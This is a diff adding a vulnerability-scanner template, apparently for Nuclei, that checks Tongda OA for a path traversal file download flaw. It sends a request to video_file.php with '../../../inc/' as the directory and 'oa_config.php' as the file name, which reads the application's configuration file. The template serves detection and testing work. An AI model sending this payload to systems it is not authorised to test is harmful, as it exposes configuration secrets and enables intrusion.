@@ -1,0 +1,25 @@
+id: Tongda-OA-file-download
+
+info:
+  name: Tongda OA file download
+  author: cr
+  severity: high
+  description: Tongda-OA-file-download
+  tags: Tongda,file-download
+
+requests:
+  - method: GET
+    path:
+      - '{{BaseURL}}/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php'
+
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        regex:
+          - "$ROOT_PATH"
+        part: body
+
+      - type: status
+        status:
+          - 200
